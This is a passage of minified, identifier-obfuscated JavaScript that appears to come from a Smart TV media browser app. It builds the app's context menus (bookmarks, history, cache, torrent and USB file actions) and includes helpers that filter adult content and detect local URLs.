div.innerHTML=maJor.fp(html);div.style.top=($_("l01Il0Ilu0D101OIYpr"+this.lIl00l0QcIl01IIYpr).offsetTop+$_("MenuCh").offsetTop)+"px";$_("main").appendChild(div);var mR=$_("MenuCh").offsetLeft+$_("MenuCh").offsetWidth;if($_("site").offsetWidth-mR<380)
$_("submenu").style.left=($_("MenuCh").offsetLeft-$_("submenu").offsetWidth-1)+"px";else $_("submenu").style.left=(mR+1)+"px";this.pos(0,!0)},enter:function(n){if(typeof n!="undefined")this.pos(n);if(this.subMenu.length>0){var cmd=this.subMenu[this.sublIl00l0QcIl01IIYpr].cmd;var args=this.subMenu[this.sublIl00l0QcIl01IIYpr].args;var plch=this.subMenu[this.sublIl00l0QcIl01IIYpr]}else{cmd=this.Menu[this.lIl00l0QcIl01IIYpr].cmd;args=this.Menu[this.lIl00l0QcIl01IIYpr].args;plch=this.Menu[this.lIl00l0QcIl01IIYpr]}
if(plch.playlist_url||plch.stream_url){Il01QllQll().navigate(plch);this.close()}else ContextMenu.play(cmd,args)},pos:function(n,mode){var is_sub=this.subMenu.length;if(n=="+"||n=="-"){if(is_sub){if(n=="+")this.sublIl00l0QcIl01IIYpr++;else this.sublIl00l0QcIl01IIYpr--}else{if(n=="+")this.lIl00l0QcIl01IIYpr++;else this.lIl00l0QcIl01IIYpr--}}else if(n!==null){if(is_sub)this.sublIl00l0QcIl01IIYpr=n;else this.lIl00l0QcIl01IIYpr=n}
if(is_sub){if(mode){if(this.sublIl00l0QcIl01IIYpr<0)this.sublIl00l0QcIl01IIYpr=is_sub-1;if(this.sublIl00l0QcIl01IIYpr>(is_sub-1))this.sublIl00l0QcIl01IIYpr=0;for(var i=0;i<is_sub;i++){if(i==this.sublIl00l0QcIl01IIYpr)$_("subl01Il0Ilu0D101OIYpr"+i).style.backgroundColor="#6d6d6d";else $_("subl01Il0Ilu0D101OIYpr"+i).style.backgroundColor="transparent"}}
if(this.submenuParent!=this.lIl00l0QcIl01IIYpr)this.closeSubMenu();else return}else{if(this.lIl00l0QcIl01IIYpr<0)this.lIl00l0QcIl01IIYpr=this.Menu.length-1;if(this.lIl00l0QcIl01IIYpr>(this.Menu.length-1))this.lIl00l0QcIl01IIYpr=0;for(var i=0;i<this.Menu.length;i++){if($_("l01Il0Ilu0D101OIYpr"+i)){if(i==this.lIl00l0QcIl01IIYpr)$_("l01Il0Ilu0D101OIYpr"+i).style.backgroundColor="#6d6d6d";else $_("l01Il0Ilu0D101OIYpr"+i).style.backgroundColor="transparent"}}}
var tmp=$_("site").offsetTop;tocroll($_("MenuCh"),$_("l01Il0Ilu0D101OIYpr"+ContextMenu.lIl00l0QcIl01IIYpr));$_("site").offsetTop=tmp},hasRight:function(){return(!this.subMenu.length&&$_("menucr"+this.lIl00l0QcIl01IIYpr))},render:function(){maJor.hintremove();var html="",el;for(var i=0;i<this.Menu.length;i++){if(this.Menu[i].overline)html+="<div style='height:1px;margin:2px 0px 0px 0px;border-top:1px solid gray;'>&nbsp;</div>";if(this.Menu[i].icon){var m_img=String(this.Menu[i].icon);if(m_img.indexOf("/")==0)m_img="http://browser.appfxml.com/img"+m_img;m_img="<img src='"+_img(m_img)+"' />"}else var m_img="";if(this.Menu[i].right!=null)var f_img="<img id='menucr"+i+"' align='right' style='margin-right: -4px;' src='"+_img("_ST_b_f.png")+"' width='21' height='27' />";else var f_img="";html+=gVs(this.Menu[i].ch,"before");html+="<div"+lIlI11I1I_q0000I1Ypr(1,[" onmousemove=\"ContextMenu.pos("+i+");\" onclick=\"ContextMenu.enter();\"",""])+" id='l01Il0Ilu0D101OIYpr"+i+"' class='menucontext'><div class='menuicon'>"+m_img+"</div>"+this.Menu[i].title+f_img+"</div>";html+=gVs(this.Menu[i].ch,"after")}
$_("MenuCh").style.width="350px";$_("MenuCh").style.display="block";$_("MenuCh",html);var sel=getSelect(),pos_x="",pos_y="",l01Il0Ilu0D101OIYpr=$_("MenuCh");if(sel==-4)el=$_("kb"+oInset.omni_hor);else if(sel==-1)el=$_(Il01QllQll().getId());if(el){pos_x=el.offsetLeft;pos_y=el.offsetTop;if(el.offsetParent&&el.offsetParent.offsetLeft){pos_x+=el.offsetParent.offsetLeft;pos_y+=el.offsetParent.offsetTop}}else if(sel>=0){if($_("ch"+sel)){pos_x=$_("ch"+sel).offsetLeft;pos_y=$_("ch"+getSelect()).offsetTop-buff.scrollsitetop()+$_("site").offsetTop}}
if(pos_x===""){l01Il0Ilu0D101OIYpr.style.left="";l01Il0Ilu0D101OIYpr.style.top=""}else{pos_x+=30;pos_y+=12;l01Il0Ilu0D101OIYpr.style.left=pos_x+"px";l01Il0Ilu0D101OIYpr.style.top=pos_y+"px"}
var l01Il0Ilu0D101OIYprOffsetLeft=l01Il0Ilu0D101OIYpr.offsetLeft+20;var l01Il0Ilu0D101OIYprOffsetTop=l01Il0Ilu0D101OIYpr.offsetTop+20;if(l01Il0Ilu0D101OIYprOffsetLeft+l01Il0Ilu0D101OIYpr.offsetWidth>maJor.screen().w){l01Il0Ilu0D101OIYpr.style.left=(maJor.screen().w-l01Il0Ilu0D101OIYpr.offsetWidth-20)+"px"}
var min_y=oInset.panel.is_hide()?30:71;if(l01Il0Ilu0D101OIYprOffsetTop+l01Il0Ilu0D101OIYpr.offsetHeight>maJor.screen().h){pos_y=maJor.screen().h-l01Il0Ilu0D101OIYpr.offsetHeight-20;if(pos_y<min_y)pos_y=min_y;l01Il0Ilu0D101OIYpr.style.top=pos_y+"px"}
l01Il0Ilu0D101OIYpr.style.overflowY="auto";l01Il0Ilu0D101OIYpr.style.maxHeight=(maJor.screen().h-min_y-20)+"px";maJor.setHandler("context");this.pos(0)},getTopMenu:function(){var topMenu=[];var dop="";if(!maJor.user){dop="_FPProfile_<br><span style='font-size:70%;color:#d1d1d1;padding-left: 29px;'>_FPSign in to sync browser data across devices_</span>"}else{dop="_FPProfile_ "+maJor.user.login;if(maJor.timestamp<3){dop+="<br><span style='font-size:70%;padding-left: 29px;color:#ff9800; font-weight:bold;'>Для Вас есть информация в Профиле</span>"}}
topMenu.push({title:dop,cmd:function(){Il01QllQll().navigate("http://cloudflare.appfxml.com/browseraccount/")}});topMenu.push({title:"_FPNew inset_",cmd:"cmdNewInset"});topMenu.push({title:"_FPNew private inset_",cmd:"cmdNewInsetPriv"});topMenu.push({title:"_FPNastrGlPoisk_",cmd:"cmdGoURL",args:"about:configsearch"});topMenu.push({title:"_FPNastroiki_",cmd:"cmdGoURL",args:"about:settings",icon:_img("_ST_settings.png")});topMenu.push({title:"Контакты и Условия использования",cmd:"cmdGoURL",args:"about:info"});topMenu.push({title:"_FPZakladki_  _FPHistory_ Сохраненные страницы",cmd:"cmdGoURL",args:"about:favorites",icon:_img("_ST_zakl.png")});var tts="_FPVijtiV_ MSX APPFXML STORE";if(maJor.platform()==="tizen")tts+=" (HTML5)";if(!maJor.platform().match(/mag|dune|tizen|android-device/)){topMenu.push({title:tts,cmd:"cmdForkStore"})}
topMenu.push({title:(maJor.params.get('ts')>0?"_FPSave and_ ":"")+"_FPEXIT_",cmd:"cmdExit",icon:"/exit.png"});return topMenu},getFavMenu:function(){var favMenu=[];if(gP("SEARCH_TEMPL")){var ex=lIQlI1lSe1pI1lQIYpr(gP("SEARCH_TEMPL"));if(ex>=0){favMenu.push({title:"_FPEdit in Search engines_",cmd:function(){OpenUrl("about:configsearch#edit:sites:"+ex)}})}else{favMenu.push({title:"_FPDobavitVglob_",cmd:function(){var x=(Il01QllQll().history&&Il01QllQll().history.length>0)?Il01QllQll().history[Il01QllQll().history.length-1]:{"title":"","img":gP("parentCh")["logo_30x30"]};var ttl=x.title+" "+gP("parentCh")["title"];var u=gP("SEARCH_TEMPL");if(typeof gP("parentCh")["search"]=="object"){if(gV(gP("parentCh")["search"],"title")!="")ttl=gV(gP("parentCh")["search"],"title");if(gV(gP("parentCh")["search"],"icon")!="")x.img=gV(gP("parentCh")["search"],"icon")}
Il01QllQll().navigate({"playlist_url":"about:configsearch#edit:sites:new","new":{"title":ttl,"logo":x.img,"url":u}})}})}}else{favMenu.push({title:"_FPDobavitV_ _FPStartovoeMenu_",cmd:"cmdToStart",icon:"/addtostart.png"});favMenu.push({title:"_FPDobavitV_ _FPBookmark toolbar_",cmd:"",args:"bookmarks/toolbar"});favMenu.push({title:"_FPDobavitV_ _FPzakladki_",cmd:"Bookmarks",icon:"/addzakl.png",right:1});if(this.lastBookm.url)favMenu.push({title:"_FPDobavitV_ "+this.lastBookm.title,cmd:"",args:this.lastBookm.url,icon:this.lastBookm.logo_30x30})}
return favMenu},getChmenu:function(ch){for(var i in ch.menu){var menu={"title":ch.menu[i].title,"cmd":function(a){var p=gPL();if(ch.menu[a].menu){ContextMenu.showSubMenu(null,ch.menu[a].menu);return 1}else if(p.is_mark){p.is_mark=!1;for(var j=0;j<p.channels.length;j++){if(p.is_mark_array[j]=="1"){p.channels[j].menu[a].from_menu=!0;Il01QllQll().navigate(p.channels[j].menu[a])}}}else{Il01QllQll().navigate(ch.menu[a]);if(ch.menu[a].search_on)return 1}},"args":i,"icon":(ch.menu[i].icon||ch.menu[i].logo_30x30),"right":(ch.menu[i].menu?"right":null),"ch":ch.menu[i]};this.Menu.push(menu)}},show:function(m,menu){this.lIl00l0QcIl01IIYpr=0;if(m==null)m="";this.Menu=[];var curPage=gP();var ch=Il01QllQll().curCh();if(menu)ch={"menu":menu,"playist_url":""};if(m=="topmenu"){Il01QllQll().select=-4;oInset.omni_hor=6;oInset.panel.set_show();this.Menu=this.getTopMenu()}else if(m=="favmenu")this.Menu=this.getFavMenu();else if(getSelect()==-2){this.Menu.push({"title":"_FPUdalit_ _FPizZakladok_","cmd":"cmdDel","icon":"/delete.png"})}else if(getSelect()==-1&&m==""){if(oldinset!=null&&m!="favmenu"){this.Menu.push({"title":"_FPOpen closed tab_","cmd":"cmdOpenInsetClose"})}
if(insetSelect==insetActive&&!l0OII100kdNdQl01lYpr()){if(Il01QllQll().get("b"))this.Menu.push({"title":"_FPRazblVkl_","cmd":function(){Il01QllQll().put("b","0")}});else this.Menu.push({"title":"_FPZablVkl_","cmd":function(){Il01QllQll().put("b","1")}});if(Il01QllQll().get("a"))this.Menu.push({"title":"_FPUdIzSt_","cmd":function(){Il01QllQll().put("b","0");Il01QllQll().put("a","0")}});else this.Menu.push({"title":"_FPUstSart_","cmd":function(){Il01QllQll().put("b","1");Il01QllQll().put("a","1")}})}else if(oldinset==null)return}else if(this.submenuSelIcon.selicon){if(this.submenuSelIcon.title.indexOf("--")>0)var title=this.submenuSelIcon.title.split("--")[1];else title=this.submenuSelIcon.title;this.Menu.push({"title":"_FPSetIconFor_ \""+title.substr(0,8)+"\"","cmd":"cmdSetIcon","icon":curCh("logo_30x30"),args:curCh("logo_30x30")})}else{if(typeof ch.menu=="object"){if(m=="onlymenu"){this.Menu=[]}
this.getChmenu(ch)}
if(m!="onlymenu"){if(gV(ch,"playlist_url")!="menu")this.Menu.push({"title":"_FPOpen_","cmd":function(){OpenUrl()}});if(Il01QllQll().get("b")!="")this.Menu.push({"title":"_FPRazblVkl_","cmd":"cmdInsetBlock"});if(vPlayer.audio.played()){this.Menu.push({"title":"_FPAudioplayer_","cmd":"cmdAudio",right:1})}
if(gP().lO10111O0001lOl00Ypr.indexOf("wlist.php?id")>0){this.Menu.push({"title":"_FPRun widget_","cmd":function(){confirmed.create("Open application in 1280х720","Run appliction").fun=[function(){var u="http://staticdata.appfxml.com/maplewidgets/tmp/"+ch.playlist_url.substr(6)+"/index.html"+location.search;document.location=u}]}});this.Menu.push({"title":"Установить с заменой","cmd":"cmdRewrite"})}
if(curPage.channels.length>0){if(l0OII100kdNdQl01lYpr()){if(gV(ch,"source")=="fav"){this.Menu.push({"title":"_FPPeredvinut_","cmd":"cmdUp","icon":"/move.png"});this.Menu.push({"title":"_FPDeleteFromStartMenu_","cmd":"cmdDelFromStart","icon":"/delete.png"});this.Menu.push({"title":"_FPEdit_","cmd":"cmdEdit","icon":"/edit.png",right:1})}else if(String(gV(ch,"source")).match(/(usertop|vilka)/)){this.Menu.push({"title":"_FPPeremV_ _FPFavorites_ ","cmd":"cmdToStart",icon:"/addtostart.png"});this.Menu.push({"title":"Удалить из истории","cmd":"cmdDelFromStart","icon":"/delete.png"})}else if(String(gV(ch,"source")).match(/(top|third|service)/)){this.Menu.push({"title":"_FPPeremV_ _FPFavorites_ ","cmd":"cmdToStart",icon:"/addtostart.png"});this.Menu.push({"title":"_FPHide_","cmd":"cmdDelFromStart","icon":"/delete.png"})}}
if(chGroup.length>0){this.Menu.push({"title":"_FPCategorys_","cmd":"cmdGroup","icon":"/group.png"})}
if(!l0OII100kdNdQl01lYpr()&&gVs(ch,"playlist_url").match(/^(bookmarks\/|zakladki)/)){this.Menu.push({"title":"_FPEdit_","cmd":"cmdEdit","icon":"/edit.png",right:1})}
if(gP("is_iptv")>2){if(ch.epg)var t=" ("+ch.epg+")";else t=" (_FPustanovit_)";this.Menu.push({"title":"ЕПГ код"+t,"cmd":function(){fEpg.set_epg()}})}
if(apijsUrl&&payd.user)this.Menu.push({"title":"Выйти с аккаунта "+payd.user,"cmd":function(){maJor.write("provUser","");payd={};maJor.setHandler("menu");tmf()}});if($_("description")&&$_("description").offsetHeight>550)
this.Menu.push({"title":"Описание на весь экран","cmd":function(){vPlayer.description();return 1}});if(ch.stream_url&&!curPage.is_mark){this.Menu.push({"title":"_FPTo open with_","cmd":function(){var m=[];var u=String(ch.playlist_url||ch.stream_url||"");if(u.match(/^torrent:\/\/|^magnet:/)){var c1=u.replace("torrent://","");var torrserve_list=[{name:"torrserve",icon:"_ST_torrserve.png"},{name:"torrserve2",icon:"_ST_torrserve.png",title:"Torrserve reserve"}];for(var i=0;i<torrserve_list.length;i++){if(maJor.params.get(torrserve_list[i].name+"active")){if(!maJor.widgets.all[torrserve_list[i].name]||parseFloat(maJor.widgets.all[torrserve_list[i].name].version)>=1.2)xml_url="http://"+getip(torrserve_list[i].name)+"/stream/playlists.m3u?link="+encodeURIComponent(c1)+"&m3u";else xml_url="http://"+getip(torrserve_list[i].name)+"/torrent/play?m3u=true&link="+encodeURIComponent(c1);m.push({"title":torrserve_list[i].title||torrserve_list[i].name,"icon":_img(torrserve_list[i].icon),"args":xml_url,"cmd":function(a){Il01QllQll().navigate(a);return 1}})}}
if(maJor.params.get("acestreamactive")){xml_url="http://"+getip("acestream")+"/server/api?method=analyze_content&query="+encodeURIComponent(c1);m.push({"title":"AceStream","icon":_img("_ST_acesrc.png"),"args":xml_url,"cmd":function(a){Il01QllQll().navigate(a);return 1}})}
if(m.length==0){m.push({"title":"Настроить  торрент сервер","icon":_img("_ST_/torrent.png"),"cmd":function(){remoteAsk();return 1}})}}else maJor.each(maJor.getPlayer().all,function(i){m.push({"title":i.title,"icon":_img("_ST_"+i.icon),"args":i.name,"cmd":function(a){Il01QllQll().navigate(ch,a);return 1}})});ContextMenu.showSubMenu(null,m);return 1},right:1});if($_("titleid"+getSelect())&&$_("titleid"+getSelect()).style.textDecoration=="line-through")var t="_FPOtmNeProsm_";else t="_FPOtmProsm_";this.Menu.push({"title":t,"cmd":function(){if(maJor.ftimes[getIdent()])delete maJor.ftimes[getIdent()];else maJor.ftimes[getIdent()]=[1,1];maJor.write("times",l1OOl0I0IASY10lQ10Ypr(maJor.ftimes));set_times(!0);maJor.setHandler("menu")},"icon":_img("_ST_cmdTimes.png")});if(is_img(ch.stream_url))this.Menu.push({"title":"_FPSetFon_","cmd":function(){maJor.params.set("fon",ch.stream_url);FXMLPage.l1I1IQlO1ZkV1IOOOllYpr();kjtYpr.popUp("Фоном установлена ссылка:<br>"+ch.stream_url+"<br>Поменять фон можно в Настройках")}})}
if(ch.search_on){this.Menu.push({"title":"_FPDobavVglob_","cmd":function(){try{var x=Il01QllQll().history[Il01QllQll().history.length-1]}catch(e){x={"title":"","img":ch.logo_30x30}}
var ttl=x.title+" "+ch.title;var u=ch.playlist_url;if(ch.search){if(gV(ch.search,"title")!="")ttl=gV(ch.search,"title");if(gV(ch.search,"icon")!="")x.img=gV(ch.search,"icon");if(gV(ch.search,"playlist_url")!="")u=gV(ch.search,"playlist_url")}
FXMLPage.addGl(u,null,ttl,x.img)}})}
if(gP("lO10111O0001lOl00Ypr").match(/^(zakladki|bookmarks)/)){if(!curPage.is_mark)this.Menu.push({"title":"_FPPeredvinut_","cmd":"cmdUp","icon":"/move.png"});this.Menu.push({"title":"_FPUdalit_ _FPizZakladok_","cmd":"cmdDel","icon":"/delete.png"});this.Menu.push({"title":"_FPPeremV_ ","cmd":"cmdMoveBookmarks"})}
this.Menu.push({"title":"_FPObnovitStranicy_",icon:_img('_ST_page_reload.png'),"cmd":function(){Il01QllQll().reload()}});if(!gP("lO10111O0001lOl00Ypr").match(/^(about:settings)/)){this.Menu.push({"title":"_FPSource code_","playlist_url":"view-source:"+gP("lO10111O0001lOl00Ypr")});if(curPage.is_mark){this.Menu.push({"title":"_FPMark_ _FPvse_","cmd":function(){for(var i=0;i<curPage.channels.length;i++)curPage.is_mark_array[i]=1;Il01QllQll().focused()}});this.Menu.push({"title":"_FPDese"+"lect_","cmd":function(){curPage.is_mark_array={};Il01QllQll().focused();curPage.is_mark=0}})}else{this.Menu.push({"title":"_FPMark_ _FPseveral_","cmd":function(){curPage.is_mark=1;OpenUrl()}})}
if(curPage.global.player!="inner"){this.Menu.push({"title":"_FPDobavitV_ _FPzakladki_","cmd":"Bookmarks","icon":"/addzakl.png","right":1});if(this.lastBookm.url)this.Menu.push({"title":"_FPDobavitV_ "+this.lastBookm.title,"cmd":"","args":this.lastBookm.url,icon:this.lastBookm.logo_30x30})}
if(gP("is_iptv")>2){if(gV(ch,"order")!="")var st=" (Major: "+ch.order+")";else st="";this.Menu.push({"title":"_FPSorting_"+st,"cmd":"cmdSorting","icon":"/sort.png","right":1})}}
if(!l0OII100kdNdQl01lYpr())this.Menu.push({"title":"_FPDobavitV_ _FPStartovoeMenu_","cmd":"cmdToStart","icon":"/addtostart.png"})}else this.Menu.push({"title":"_FPPolnSbrosNastr_","cmd":"cmdReset"});if(gP("lO10111O0001lOl00Ypr").indexOf("about:history")!=0)
this.Menu.push({"title":"_FPHistory_","playlist_url":"about:history","icon":"_ST_history.png"});else this.Menu.push({"title":"_FPOchistitIstoriyu_","cmd":"cmdClear","args":gP("lO10111O0001lOl00Ypr").split(":")[1]});if(gP("lO10111O0001lOl00Ypr").indexOf("about:histurl")==0||gP("lO10111O0001lOl00Ypr").indexOf("about:histsearch")==0)
this.Menu.push({"title":"_FPOchistitIstoriyu_","cmd":"cmdClear","args":gP("lO10111O0001lOl00Ypr").split(":")[1]});if(gP("lO10111O0001lOl00Ypr").indexOf("about:cache")==0){this.Menu.push({"title":"_FPClear cache_","cmd":function(){maJor.write("prev_cache","");kjtYpr.inf("Cache clear OK!",1000);maJor.setHandler("menu");Il01QllQll().reload()},"icon":_img("_ST_delete.png")})}else if(gP("lO10111O0001lOl00Ypr").indexOf("no_save")==-1&&gV(curPage.global,"player")!="inner"&&!maJor.params.get("ts"))
this.Menu.push({"title":"_FPSave page to cache_","cmd":function(){if(lll1OOlPTII101IYpr(null,!0))kjtYpr.inf("OK!",1200);else kjtYpr.inf("Error!",1200);maJor.setHandler("menu")}});if(!l0OII100kdNdQl01lYpr()&&maJor.params.get('lang')!="ru")
this.Menu.push({"title":"_FPTranslate_ "+maJor.params.get("lang"),"cmd":"cmdTranslate","icon":"/translate.png"});if(gP("lO10111O0001lOl00Ypr").indexOf("about:settings")!=0){if(!l0OII100kdNdQl01lYpr()){this.Menu.push({title:"_FPNaitiVglobPoiske_...",cmd:"cmdSearch",icon:"/search.png"})}
if(!l0OII100kdNdQl01lYpr()){this.Menu.push({title:"Рецензии и фильмография...",cmd:function(){var data={title:"Поиск фильмографии и рецензий на кинопоиске: "};data.channels=[];if(Il01QllQll().history.length>1){var ttl=Il01QllQll().history[Il01QllQll().history.length-1].title.split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data.channels.unshift({logo_30x30:"http://st.kp.yandex.net/images/logoWhite.png",title:s,playlist_url:"http://parsers.appfxml.com/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}}
ttl=gVs(ch,"title").replace(/\s+/g," ").split(" ");if(ttl.indexOf("<div")==0){ttl=gVs(ch,"title").match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с)/ig," ").replace(/\s+/g," ").split(" ")}
var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data.channels.unshift({logo_30x30:"http://st.kp.yandex.net/images/logoWhite.png",title:s,playlist_url:"http://parsers.appfxml.com/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}
maJor.setHandler("menu");OpenUrl(data,"usb://"+gP("lO10111O0001lOl00Ypr")+"#kinopoisk")}})}
this.Menu.push({title:"_FPNastroiki_","icon":"/insetM"+"enu.png",cmd:function(){ContextMenu.show('topmenu');return 1}})}
if(gP("lO10111O0001lOl00Ypr").indexOf("usb:/")==0||(maJor.platform()=="maple"&&curCh("stream_url")!="")){this.Menu.push({title:"_FPKopirovat_",cmd:function(){var ss="";var ssn="";markedObj.entries(function(ch){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.indexOf("md5hash")!=-1){kjtYpr.inf("_FPNeedToOpenAndCloseTheVideoPlayerThenRepeatCopying_!",1500);maJor.setHandler("menu");return}
if(ss!="")ss+="-|-";ss+=s;if(ssn!="")ssn+="-|-";ssn+=ch.title});markedObj.cancel();copyUsb=ss;copyUsbNames=ssn}});if(gP("lO10111O0001lOl00Ypr")!="usb://"&&gP("lO10111O0001lOl00Ypr").indexOf("usb:/")==0){if(copyUsb!="")this.Menu.push({title:"_FPVstavit_",cmd:function(){s=gP("lO10111O0001lOl00Ypr").replace("usb://","").replace("xml://","");copyUsbMode=0;if(s.length>0){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPWhileCopyingFilesCannotViewVideoAndAudio_");vPlayer.maple.pasteFile(copyUsb,s,copyUsbNames)}
copyUsb="";setTimeout("Il01QllQll().reload();",850)}});this.Menu.push({title:"<font color=red>_FPUdalit_</font>",cmd:function(){confirmed.create("_FPAre you sure_?","_FPUdalit_").fun=[function(){markedObj.entries(function(ch,n){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.length>0)usbDelete(s)});Il01QllQll().reload()}];markedObj.cancel()},icon:_img("_ST_delete.png")})}}
this.Menu.push({title:"_FPZakladki_",cmd:function(){OpenUrl("about:favorites")},icon:_img("_ST_zakl.png")});if(maJor.params.get("remote")>0){this.Menu.push({title:"Обновить сост. RemoteFork",cmd:"cmdRemoteUpdate","icon":"_ST_pcremote.png?ndate240617_"})}
tts=(maJor.params.get('ts')>0?"_FPSave and_ ":"")+"_FPVijtiV_ MSX APPFXML STORE";if(!maJor.platform().match(/mag|dune/))this.Menu.push({title:tts,cmd:"cmdForkStore","overline":1,"icon":"http://msx.appfxml.com/msx/appfxmlstore_m.png"});this.Menu.push({title:(maJor.params.get('ts')>0?"_FPSave and_ ":"")+"_FPEXIT_",cmd:"cmdExit"})}}
if(this.Menu.length==0){kjtYpr.inf("Empty menu!",1200);return}
this.Menu.push({title:"_FPCancel_",cmd:"cmdCancel"});this.render()}};var copyUsb="",copyUsbNames="",copyUsbMode=0;function tocroll(p,c){if(c){var site_bot=p.offsetHeight;var y_t=Math.ceil(c.offsetTop-site_bot*0.18);var y_b=Math.ceil(c.offsetTop+c.offsetHeight-site_bot*0.87);if(y_t<p.scrollTop){p.scrollTop=y_t}else if(y_b>p.scrollTop)p.scrollTop=y_b}}
function tmf(){if(maJor.platform()=="tizen")keyHandler({"keycode":10009,"preventDefault":function(){}});else keyHandler({"keycode":VK_BACK,"preventDefault":function(){}})}
var goBack=!1;function gotoStart(){if(Il01QllQll()&&Il01QllQll().navigate){Il01QllQll().navigate("about:blank");maJor.seSt=[];maJor.Password=""}else kjtYpr.popUp("Err open START menu<br>",5000)}
function lll1OOlPTII101IYpr(url,mode){url=Il01QllQll().get("url");if(!url||url.indexOf("no_save")>0||url==="submenu")return 0;if(mode||version_local_js){var n_start=9,n_per=9,n_zakl=9,j=0;for(var i=Il01QllQll().history.length-1;i>-1;i--){var historyItem=Il01QllQll().history[i];if(l0OII100kdNdQl01lYpr(historyItem.url)&&n_start===9)n_start=j;if(historyItem.title==="_FPPerPoAdr_"&&n_per===9)n_per=j;if((historyItem.url.indexOf("bookmarks")===0||historyItem.url.indexOf("zakladki")===0)&&n_zakl===9)n_zakl=j;j++}
if(n_start<5||n_per<3||n_zakl<3||mode){if(n_start===0||n_per===0||n_zakl===0)return 0;var savePrev=lIlI1VBOOlI01QYpr(maJor.read("prev_cache"))||{};if(prev[url]&&prev[url].setcache&&prev[url].setcache!==""){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Эта страница была загружена с кеша и может содержать устаревшие данные! Проверьте наличие интернет соединения или возможно страница была перемещена по новому адресу!",2200);return 0}
savePrev[url]={"setimg":Il01QllQll().get("img"),"settitle":Il01QllQll().get("title"),"typeList":prev[url]?prev[url].typeList:"","setcache":Math.ceil(T.inetTime/1000),"channels":prev[url]?prev[url].channels:[],"url":url};maJor.write("prev_cache",l1OOl0I0IASY10lQ10Ypr(savePrev))}}
return 1}
var rCook=new RegExp("^https?://(www\.|m\.|p\.lnka\.ru/|fxmlparsers\.ru|fxmlparsers\.in.net/)?(https?://)?(.*?)(:|\\?|/|$|#)");var rUrl=new RegExp("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?::\\d{1,5})?$|^http(s)?:\\/\\/(.*)$","i");function is_xxx(n,n2){if(typeof n==="object"){if(gV(n,"title")===""&&gV(n,"display_title")===""&&n&&typeof n[0]==="undefined")return 0;for(var i in n){if(is_xxx(n[i])){return 1}}
return 0}
n=(n2!=null)?n2:n||"";if(typeof n!=="string")return 0;n=n.split("#POST")[0];if(/^cmd:|^magnet:/.test(n))return 0;if(/^(http:|\/\/)/.test(n)){var parts=n.split('/');for(var i=0;i<parts.length;i++){var part=parts[i];if(/^[A-Za-z0-9+/=]{15,}$/.test(part))continue;if(/(18_plus|18plus|porn|ххх|ххх$|^xxx|sex|adult|\.sisi\.am)/i.test(part))return 1}
return 0}
if(/(русская ночь|18plus|playboy|creampi|18\+|porn|hustler|adult|pron|masturb|порно|мастурб|минет|эротика|brazzers)/i.test(n))return 1;return/\b(ххх|sex|anal|секс|анал|milf|fetish|cuckold|lesbian|dick|tits|blowjob)\b/i.test(n)?1:0}
function is_parse_self(u1,u2){var dm=u1.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm!=null){dm2=u2.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm2!=null)if(dm[1]==dm2[1])return 1}
return 0}
function is_local(url){if(url.match(/^(\/|usb:\/\/)/))return!0;if(url.match(/^http:\/\/(127\.|^10\.|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-1]\.|^192\.168\.)/))return!0;if(url.match(/(\/treeview|:45397\/|:8027\/|:8028\/|\/parserlink|\/smarttv\/acestream\.php)/))return!0;var ip="";if(maJor.params.get("acestream")!="")ip=maJor.params.get("acestream").split(":")[0];if(maJor.params.get("remoteip")!="")ip=maJor.params.get("remoteip").split(":")[0];if(ip!="")if(url.indexOf("http://"+ip)==0)return!0;return!1}
function is_white(n){n=n||IlIll11I("lO10111O0001lOl00Ypr")||gP("lO10111O0001lOl00Ypr");if(!n)return 0;if(is_xxx(curCh()))return 0;if(n=="about:settings"||n.indexOf("vk_audio")>0)return 1;var isx=0;for(i=Il01QllQll().history.length-1;i>=0;i--){try{var url=Il01QllQll().history[i].url;var t=Il01QllQll().history[i].title;if(l0OII100kdNdQl01lYpr(url)||url.indexOf("http")!=0){break}
if(is_xxx(url)||is_xxx(t)){isx=1}}catch(e){}}
if(!isx)return 1;return 0}
function is_m3u8(url){url=url||vPlayer.playUrl;if(!url)return 0;if(curCh("type")=="vod")return 0;if(curCh("type")=="hls")return 2;if(gP("is_iptv")>3&&url.match(/\.tv.*?\/live\/.*?\.ts/))return 2;if(url.match(/\.(flv|mp4|mkv|avi|3gp|m2t|m2ts|mov|mpg|mpeg|ts).{0,1}$/)){return 0}
if(url.match(/\.m3u8/)){return 2}
if(gP("is_iptv")>3)return 1;if(url.indexOf("proxym3u8")>0)return 2;if(url.indexOf("ace/getstream")>0)return 0;if(url.indexOf(":8027")>0)return 0;if((url.indexOf("j.mp")>0&&gP("is_iptv")>2))return 2;else if(url.indexOf("/chtst")>0||url.indexOf("/udp")>0||url.indexOf("/hls")>0)return 1;else if(gP("lO10111O0001lOl00Ypr").indexOf(".m3u")>0&&url.indexOf("iptv")>0)return 1;else return 0}
function ol0I1OIuIyUII0lYpr(url){Il01QllQll().navigate(url)}
var rt_obj=null;function xhr_bookmark(u,cmd,str){var data={"channels":[]};s=maJor.read("bookmarks");var sd=[];if(s!=""){sd=lIlI1VBOOlI01QYpr(s);if(sd==null)sd=[];if(typeof sd.push=="undefined")sd=[]}
